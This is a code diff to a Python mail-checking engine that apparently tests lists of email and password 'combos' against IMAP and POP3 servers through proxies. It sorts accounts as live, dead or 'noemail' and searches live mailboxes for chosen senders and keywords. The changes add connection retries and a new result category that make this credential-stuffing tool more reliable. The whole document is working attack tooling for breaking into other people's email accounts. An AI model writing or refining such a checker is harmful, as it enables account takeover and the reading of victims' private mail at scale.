@@ -372,11 +372,30 @@ class FastImapEngine:
         """Check one account through raw POP3."""
         reader = None
         writer = None
+        is_live = False
         try:
-            reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
-            banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-            if not banner or not banner.strip().startswith(b"+OK"):
-                raise ConnectionError("Invalid POP3 greeting banner")
+            connected = False
+            for attempt in range(2):
+                try:
+                    reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
+                    banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                    if banner and banner.strip().startswith(b"+OK"):
+                        connected = True
+                        break
+                    raise ConnectionError("Invalid POP3 greeting banner")
+                except Exception:
+                    if writer:
+                        try:
+                            writer.close()
+                            await writer.wait_closed()
+                        except Exception:
+                            pass
+                        writer = None
+                    if attempt == 0:
+                        await asyncio.sleep(0.4)
+
+            if not connected:
+                raise ConnectionError("Failed to connect POP3 server")
 
             # Try USER with full email address
             writer.write(f"USER {email_addr}\r\n".encode())
@@ -422,6 +441,7 @@ class FastImapEngine:
                 return
 
             # Account is LIVE!
+            is_live = True
             is_pure_empass = (self.target_senders == ["*"]) or (not self.target_senders and not self.keywords)
             if is_pure_empass:
                 self.live_count += 1
@@ -541,11 +561,18 @@ class FastImapEngine:
                 pass
 
         except Exception:
-            self.die_count += 1
-            self.checked += 1
-            await self.write_queue.put(("die", combo))
-            if self.on_progress:
-                self.on_progress("die")
+            if is_live:
+                self.noemail_count += 1
+                self.checked += 1
+                await self.write_queue.put(("noemail", combo))
+                if self.on_progress:
+                    self.on_progress("noemail")
+            else:
+                self.die_count += 1
+                self.checked += 1
+                await self.write_queue.put(("die", combo))
+                if self.on_progress:
+                    self.on_progress("die")
         finally:
             if writer:
                 try:
@@ -619,26 +646,36 @@ class FastImapEngine:
             reader = None
             writer = None
             banner = None
-            try:
-                reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
-                banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
-                if banner and banner.strip().startswith(b"+OK"):
-                    # Server is actually POP3
-                    try:
-                        writer.close()
-                        await writer.wait_closed()
-                    except Exception:
-                        pass
-                    await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
-                    return
-                if not banner or not (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
-                    raise ConnectionError("Invalid greeting banner")
-            except Exception:
-                if writer:
-                    try:
-                        writer.close()
-                    except Exception:
-                        pass
+            connected = False
+            for attempt in range(2):
+                try:
+                    reader, writer = await self._connect_imap(server, port, use_ssl, proxy)
+                    banner = await asyncio.wait_for(reader.readline(), timeout=self.timeout)
+                    if banner and banner.strip().startswith(b"+OK"):
+                        # Server is actually POP3
+                        try:
+                            writer.close()
+                            await writer.wait_closed()
+                        except Exception:
+                            pass
+                        await self._check_single_account_pop3(server, port, use_ssl, proxy, email_addr, password, combo)
+                        return
+                    if not banner or not (b"* OK" in banner.upper() or b"IMAP" in banner.upper()):
+                        raise ConnectionError("Invalid greeting banner")
+                    connected = True
+                    break
+                except Exception:
+                    if writer:
+                        try:
+                            writer.close()
+                            await writer.wait_closed()
+                        except Exception:
+                            pass
+                        writer = None
+                    if attempt == 0:
+                        await asyncio.sleep(0.4)
+
+            if not connected:
                 # Dual-port fallback (993 SSL <-> 143 Plain)
                 alt_port = 143 if port == 993 else 993
                 alt_ssl = (alt_port == 993)
@@ -657,7 +694,7 @@ class FastImapEngine:
                     if self.on_progress:
                         self.on_progress("die")
                     return
-
+            is_live = False
             try:
                 # STARTTLS upgrade if plain connection and required/supported
                 if not use_ssl and b"STARTTLS" in banner.upper() and b"LOGINDISABLED" in banner.upper():
@@ -817,11 +854,18 @@ class FastImapEngine:
                 await writer.drain()
 
             except Exception:
-                self.die_count += 1
-                self.checked += 1
-                await self.write_queue.put(("die", combo))
-                if self.on_progress:
-                    self.on_progress("die")
+                if is_live:
+                    self.noemail_count += 1
+                    self.checked += 1
+                    await self.write_queue.put(("noemail", combo))
+                    if self.on_progress:
+                        self.on_progress("noemail")
+                else:
+                    self.die_count += 1
+                    self.checked += 1
+                    await self.write_queue.put(("die", combo))
+                    if self.on_progress:
+                        self.on_progress("die")
             finally:
                 if writer:
                     try:
